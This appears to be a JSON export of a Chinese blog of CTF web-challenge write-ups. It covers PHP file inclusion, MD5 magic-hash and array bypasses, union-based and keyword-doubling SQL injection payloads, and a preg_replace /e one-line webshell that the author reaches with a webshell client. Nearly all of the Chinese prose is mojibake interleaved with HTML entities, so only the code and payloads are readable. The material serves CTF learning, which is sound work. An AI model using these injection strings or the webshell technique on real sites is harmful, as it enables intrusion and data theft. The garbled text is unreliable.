&lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; è·å–flag{edulcni_elif_lacol_si_siht} è¯·è¾“å…¥å¯†ç æç¤ºäº†5ä½æ•°çš„å¯†ç ï¼Œç›´æ¥çˆ†ç ´ å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯æ‰“å¼€é¢˜ç›®åï¼Œå‡ºç°ä¸€æ®µä»£ç ï¼Œåº”è¯¥æ˜¯md5å€¼ï¼Œå¯æ˜¯è§£ç ä¸ºç©ºå¯†ç  æ‰«æç›®å½•python dirsearch.py -u http://123.206.87.240:8002/web16/ -e php å‘ç°äº†index.php.bak è¿™ä¸ªåº”è¯¥æ˜¯åœ¨ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„å¤‡ä»½æ–‡ä»¶ï¼›EDITPLUS è¿™ç±»çš„æ–‡æœ¬ç¼–è¾‘å™¨åœ¨ç¼–è¾‘æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè¿™æ ·çš„å¤‡ä»½ï¼›å¦‚æœç¼–è¾‘åæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼›å¯ä»¥åˆ é™¤.BAKæ–‡ä»¶ (æ¥è‡ªç™¾åº¦) ä¸‹è½½.bakæ–‡ä»¶æ‰“å¼€åï¼Œå‘ç°æºç ï¼Œå¼€å§‹å®¡è®¡ 12345678910111213141516171819202122&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);//å¯¹keyè¿›è¡Œäº†è¿‡æ»¤parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;//è¿™é‡Œéœ€è¦ä½¿ç”¨md()å‡½æ•°å¯¹æ•°ç»„å¤„ç†æ—¶çš„æ¼æ´ echo $flag.\"å–å¾—flag\";&#125;?&gt; url:http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡ 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰ payload: ?kekey1[]=da&amp;kekey2[]=dada 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´ å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚ ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a æˆç»©å•1231' and 1=1 # 1' and 1=2 # ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹ æ‰‹å·¥æ³¨å…¥1.1&#39; order by 4 #å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ2.çˆ†æ•°æ®åº“` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.çˆ†å‡ºè¡¨å-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.å­—æ®µå-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag å¾—åˆ°flag (select skctf_flag from skctf_flag.fl4g) ç§‹åå±±è½¦ç¥çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“éœ€è¦ç”¨pythonçš„è„šæœ¬æ¥åšï¼ˆèœé¸¡ä¸é…ï¼‰ï¼Œç½‘ä¸Šæ‰¾çš„è„šæœ¬ 123456789101112import requestsimport reurl='http://120.24.86.145:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)ans=re.findall('&lt;div&gt;(.*?)=?;&lt;/div&gt;',requestpage.text)#è·å–è¡¨è¾¾å¼ï¼Œæˆ‘æ­£åˆ™å†™çš„å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œå¤šåŒ¹é…äº†æœ€åçš„=?ä¸¤ä¸ªå­—ç¬¦ans=\"\".join(ans)#åˆ—è¡¨è½¬ä¸ºå­—ç¬¦ä¸²ans=ans[:-2]#å»æ‰æœ€åçš„=?post=eval(ans)#è®¡ç®—è¡¨è¾¾å¼çš„å€¼data=&#123;'value':post&#125;#æ„é€ postçš„dataéƒ¨åˆ†flag=r.post(url,data=data)print(flag.text)","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"å¼±ç±»å‹","slug":"å¼±ç±»å‹","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"åŸŸåè§£æ","slug":"åŸŸåè§£æ","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"çˆ†ç ´","slug":"çˆ†ç ´","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"ç»¼åˆ2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/ç»¼åˆ2/","text":"NCTF-ç»¼åˆ2 è¿›å…¥é¡µé¢ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œéšä¾¿ç‚¹ç‚¹ ç•™è¨€å¯ä»¥æ­£å¸¸æäº¤ï¼Œæœ¬ä»¥ä¸ºæœ‰xss,ä½†æ˜¯å·²ç»æç¤ºä¸æ˜¯xss çœ‹åˆ°æœ€ä¸‹é¢æœ‰ä¸ªç½‘ç«™è¯´æ˜ æœ¬CMSè¯´æ˜ ï¼Œæœ‰ç”¨çš„å†…å®¹å¦‚ä¸‹ config.phpï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯ï¼Œç§»æ¤æ­¤CMSæ—¶è¦ä¿®æ”¹ index.phpï¼šä¸»é¡µæ–‡ä»¶ passencode.phpï¼šFunnyå…¬å¸è‡ªå†™å¯†ç åŠ å¯†ç®—æ³•åº“ say.phpï¼šç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚ sm.txtï¼šæœ¬CMSçš„è¯´æ˜æ–‡æ¡£ saeçš„information_schemaè¡¨å¥½åƒæ²¡æ³•æ£€ç´¢ adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txtå¯ä»¥ä½¿ç”¨phpä¼ªåè®®ä»»æ„è¯»å–æ–‡ä»¶å†…å®¹ã€‚ åŒ…æ‹¬è‡ªå·± å°è¯•è¯»å–index.phpçš„æºç ï¼Œå‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ è¯»å–about.php 123456789101112131415161718&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; æœ‰config.php echo &quot;fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼&quot;; exit();&#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;åŒ…å«äº† loginxlcteamé¡µé¢ if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;æ•æ„Ÿç›®å½•ï¼Œç¦æ­¢æŸ¥çœ‹ï¼ä½†æ˜¯ã€‚ã€‚ã€‚&#39;)&lt;&#x2F;script&gt;&quot;; &#125;&#125; è¯»å–config.phpï¼Œæ— æœ‰ç”¨ä¿¡æ¯ æŸ¥çœ‹loginxlcteam,æ˜¯ä¸ªç™»å½•é¡µé¢ åˆ°æ­¤è¿˜æ˜¯æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒå¤§ä½¬çš„åšå®¢ https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase åœ¨æœç´¢é¡µé¢ä¸­ä¹Ÿå­˜åœ¨æœ‰ç”¨ä¿¡æ¯ http://cms.nuptzj.cn/about.php?file=so.phpè·å–æºç  123456789101112131415161718192021&lt;?php //so.phpif($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123; //å¿…é¡»ä¿®æ”¹httpå¤´ï¼Œå§user-agentæ”¹æˆXlcteam Browserecho 'ä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~'; exit();&#125;$id=$_POST['soid']; //post ä¸€ä¸ªsoidinclude 'config.php';include 'antiinject.php'; //é˜²æ³¨å…¥çš„æ–‡ä»¶include 'antixss.php'; //é˜²xssçš„æ–‡ä»¶ $id=antiinject($id); //å¯¹idè¿‡æ»¤$con = mysql_connect($db_address,$db_user,$db_pass) or die(\"ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼\".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\"); //sqlæŸ¥è¯¢ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 123456789101112&lt;?php //antiinject.phpæºç  function antiinject($content) &#123; $keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\"); //å¯¹ä¸€äº›sqlæ³¨å…¥æ—¶ç”¨åˆ°çš„å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤ $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], '',$info); &#125; return $info; &#125; ?&gt; å¤§è‡´æ„æ€å°±æ˜¯ 1.åˆ¤æ–­httpè¯·æ±‚å¤´ä¸­çš„user-agentå‚æ•°æ˜¯å¦ä¸ºXlcteam Browser 2.postå‚æ•°soid 3.å¯¹soidè¿›è¡Œè¿‡æ»¤åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢ äºæ˜¯æŠ“åŒ…ä¿®æ”¹user-agent ç¡®å®šå­˜åœ¨æ³¨å…¥ç‚¹ ç”±äºä¹‹å‰æç¤ºäº†adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, ) å¯ç›´æ¥å†™å‡ºæŸ¥è¯¢è¯­å¥ 1(sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCIIç è½¬å­—ç¬¦ä¸²ç»“æœä¸ºï¼š fuckruntu ç™»å½• http://cms.nuptzj.cn/about.php?file=xlcteam.php æŸ¥çœ‹æºç  12345 &lt;?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] =&gt; '|.*|e',); array_walk($arr, $e, ''); ?&gt; çœ‹æ ·å­æ˜¯å¯ä»¥ç”¨èœåˆ€è¿æ¥çš„ é‚£æ€ä¹ˆåˆ©ç”¨å°é©¬å‘¢ï¼Œæ•°ç»„çš„valueä¸­æ˜¯|.*|eï¼Œè¿™é‡Œç”¨åˆ°äº†æ­£åˆ™åŒ¹é…çš„preg_replace()çš„ä¸€ä¸ªæ¼æ´ï¼šå‚è€ƒhttps://www.jb51.net/article/38714.htmç®€å•æ¥è¯´å°±æ˜¯æ­£åˆ™ä¸­/e(è¿™é‡Œå’Œ|eæ•ˆæœä¸€æ ·) ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ é€’preg_replaceç»™wwwï¼Œè¿™æ ·arrayä¸­çš„å€¼å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé”®å°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ­£å¥½å¯ä»¥åˆ©ç”¨preg_replaceçš„æ¼æ´ï¼Œç„¶åä¼šæ‰§è¡Œ$_POST[â€˜wtfâ€™]ï¼Œå°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯é©¬äº†ã€‚ç”¨èœåˆ€è¿æ¥ï¼š url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace å¯†ç ï¼šwtf æ€»ç»“ï¼šç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®äº†ï¼Œæ¶‰åŠåˆ°çŸ¥è¯†ç‚¹ä¹Ÿå¾ˆå¤šï¼Œè¿˜éœ€è¦å¤šçœ‹çœ‹ï¼ï¼ï¼","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQLæ³¨å…¥1é¢˜ç›®æºç ç»™å‡º 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt; é¦–å…ˆpostæ–¹æ³•ä¼ é€’userå’Œpassä¸¤ä¸ªå‚æ•°ï¼Œç„¶åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢ æ³¨å…¥ç‚¹åœ¨è¿™ä¸ªä½ç½® $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) æ„é€ è¯­å¥ select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) åœ¨usernameä¸­å¡«å…¥admin&#39;) or 1=1 #æˆ–è€…admin&#39;) and 1=1 #ï¼Œæäº¤å³å¯è·å¾—flag passcheck12345678910111213$pass=@$_POST['pass'];$pass1=***********;//è¢«éšè—èµ·æ¥çš„å¯†ç if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; strcmp() å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚ æ³¨é‡Šï¼šstrcmp() å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿã€‚ æç¤ºï¼šè¯¥å‡½æ•°ä¸ strncmp() å‡½æ•°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œé€šè¿‡ strncmp() æ‚¨å¯ä»¥æŒ‡å®šæ¯ä¸ªå­—ç¬¦ä¸²ç”¨äºæ¯”è¾ƒçš„å­—ç¬¦æ•°ã€‚ åªæœ‰pass==pass1æ—¶æ‰æ˜¾ç¤ºflag æ„Ÿè§‰è·Ÿä¹‹å‰çš„å˜é‡è¦†ç›–ç›¸ä¼¼ çŸ¥è¯†ç‚¹ï¼š strcmp()å‡½æ•° ï¼šphp5.3ä¹‹å‰çš„strcmpçš„æ¼æ´ï¼Œå½“å‚æ•°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¹è±¡æˆ–è€…æ•°ç»„æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›0ï¼› hackbarçš„ä½¿ç”¨ï¼Œpostæ–¹æ³• phpå¼±ç±»å‹ï¼Œæ•°ç»„çš„ä½¿ç”¨ã€‚ å‚è€ƒï¼š https://www.cnblogs.com/islsy/p/10667426.html èµ·åå­—çœŸéš¾123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //numberä¸­çš„æ•°å­—ä¸èƒ½åœ¨1-9 &#123; return false; &#125; &#125; return $number == '54975581388'; //numberçš„å€¼ç­‰äº54975581388ï¼Œä¸ä¹‹å‰ifè¯­å¥çŸ›ç›¾&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; å°è¯•å°†54975581388è½¬æˆåå…­è¿›åˆ¶ 0xccccccccc, cçš„aå€¼ä¸º12ï¼Œæ»¡è¶³ifåˆ¤æ–­è¯­å¥ ?key=0xccccccccc sqlinjectæŸ¥çœ‹æºç  1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //é˜²æ­¢æ³¨å…¥ $str=stripslashes($str); //æ·»åŠ  \\ &#125; return htmlentities($str, ENT_QUOTES);//è¿‡æ»¤æ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œæˆ–è€…å…¼è€Œæœ‰ä¹‹&#125;$username = @clean((string)$_GET['username']);//å¯¹è·å–çš„å‚æ•°è¿›è¡Œäº†å¤„ç†$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';//å­˜åœ¨æ³¨å…¥çš„è¯­å¥$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;--&gt; magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; åæ–œæ é‡åˆ°å•å¼•å·åï¼Œèµ·åˆ°è½¬ä¹‰ä½œç”¨ï¼Œå®é™…sqlè¯­å¥å¦‚ä¸‹ SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; è¿™é‡Œæ³¨å…¥ä¸ä¹‹å‰çš„æ³¨å…¥ä¸åŒï¼Œè¿™é‡Œé’ˆå¯¹çš„æ˜¯password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= ä½œä¸ºname å‚æ•°çš„å€¼ æ‰€ä»¥æ„é€ ?name=&amp;password=or 1=1 â€“+ SQLæ³¨å…¥2123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post æ–¹å¼æ¥æ”¶ä¸¤ä¸ªå‚æ•° mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//å¯¹pass md5åŠ å¯† $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));//è·å–pwå­—æ®µçš„å€¼ if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // æ¯”è¾ƒpasså’Œpw echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) æ­¤æŸ¥è¯¢è¯­å¥è·å¾—æˆ‘pwå€¼ä¸ºmd(1),æ‰€ä»¥if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))è¯­å¥æˆç«‹ï¼Œæ˜¾ç¤ºflag (è¿˜æ²¡å®Œå…¨ç†è§£) ç»¼åˆé¢˜ é¦–é¡µä¸­ç»™å‡ºå¾ˆé•¿çš„jsfuckï¼Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨çš„consoleè§£ç  ,ç»™å‡ºä¸€ä¸ªé¡µé¢ è®¿é—® 1bc29b36f623ba82aaf6724fd3b16718.php æç¤ºåœ¨headeré‡Œ æŸ¥çœ‹header history of bashä½¿ç”¨è¿‡linuxçš„åŒå¿—ä¼šçŸ¥é“ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯bashï¼Œåœ¨å®¶ç›®å½•ä¸­ä¼šç”Ÿæˆ.bash_historyæ–‡ä»¶ç”¨æ¥ä¿å­˜å†å²å‘½ä»¤ã€‚è®¿é—®.bash_historyæ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°è¿™æ ·çš„å†å²å‘½ä»¤ url: http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history è·å¾—zip -r flagbak.zip ./* è®¿é—® http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contentsæŸ¥çœ‹æºç è·å–è¢«æ³¨é‡Šçš„å†…å®¹ 1234$file = $_GET['file'];if(@file_get_contents($file) == \"meizijiu\")&#123; echo $nctf;&#125; åˆ†æå¯å¾— é€šè¿‡getæ–¹å¼ä¼ é€’flle=æ–‡ä»¶åå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹==â€˜meizijiuâ€™å¦‚æœç­‰äºå°±æ‰“å°flag phpä¼ªåè®®php://inputæ¥æ„é€ åŸå§‹æ•°æ®çš„åªè¯»æµ å˜é‡è¦†ç›–å‚è€ƒ https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 æºç  123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == \"meizijiu233\")&#123; echo $flag;&#125;--&gt; ?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"å¼±ç±»å‹","slug":"å¼±ç±»å‹","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"å˜é‡è¦†ç›–","slug":"å˜é‡è¦†ç›–","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 ç­¾åˆ°é¢˜æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag md5 collisionä¸€é“ç®€å•çš„md5æ¼æ´é¢˜ç›® md5å‡½æ•°æ¼æ´ æºç  12345678910$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125; å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äºQNKCDZOä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚ å¸¸è§çš„payloadæœ‰ 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1('aaroZmOk') sha1('aaK1STfY')sha1('aaO8zKZF')sha1('aa3OFF9m') ç­¾åˆ°2æç¤ºè¾“å…¥å£ä»¤ï¼Œå°è¯•è¾“å…¥å‘ç°åªèƒ½è¾“å…¥åä¸ªå­—æ¯ï¼Œä½†æ˜¯å£ä»¤æœ‰11ä¸ªå­—æ¯ F12å®¡æŸ¥å…ƒç´ ï¼Œä¿®æ”¹è¾“å…¥æ¡†çš„maxlengthå€¼ï¼Œå¤§äº11å³å¯ å†æ¬¡è¾“å…¥å£ä»¤å³å¯ã€‚ è€ƒç‚¹ä¸ºå‰ç«¯ä»£ç ä¿®æ”¹ è¿™é¢˜ä¸æ˜¯WEBè¿™é“é¢˜è¿˜çœŸä¸æ˜¯web è¿›å…¥é¢˜ç›®é“¾æ¥ï¼Œå‘ç°ä¸€å¼ åŠ¨å›¾ï¼Œæœ¬èƒ½çš„å°†å…¶æ‹–å…¥åŠ¨å›¾æŸ¥çœ‹å™¨ç§ï¼Œç»“æœä»€ä¹ˆéƒ½æ²¡å‘ç°ï¼Œäºæ˜¯æ‰“å¼€winhex å±‚å±‚é€’è¿› é¢˜ç›®ä¸ºå±‚å±‚é€’è¿›ï¼Œé€šè¿‡F12ä¸­SourcesåŠŸèƒ½ï¼ŒæŸ¥çœ‹ç½‘ç«™çš„åŒ…å«æƒ…å†µï¼Œå‘ç°åˆ°å¯ç–‘åœ°å€ï¼šSO.htmlï¼ŒæŸ¥çœ‹å‘ç°ç›¸ä¼¼å¯ä»¥åœ°å€ï¼Œæœ€ååœ¨404.htmlæºç ä¸­å¾—åˆ°flagï¼ˆç«–æ’æ’å…¥åœ¨æ ‡ç­¾ä¸­ï¼‰ï¼š 